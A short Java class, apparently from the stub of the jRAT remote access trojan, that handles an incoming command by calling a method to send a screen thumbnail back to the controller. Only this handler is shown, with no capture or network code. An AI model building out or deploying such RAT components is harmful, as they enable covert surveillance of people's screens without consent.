package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Screen;

public class Packet40Thumbnail extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Screen.sendThumbnail();
	}

}
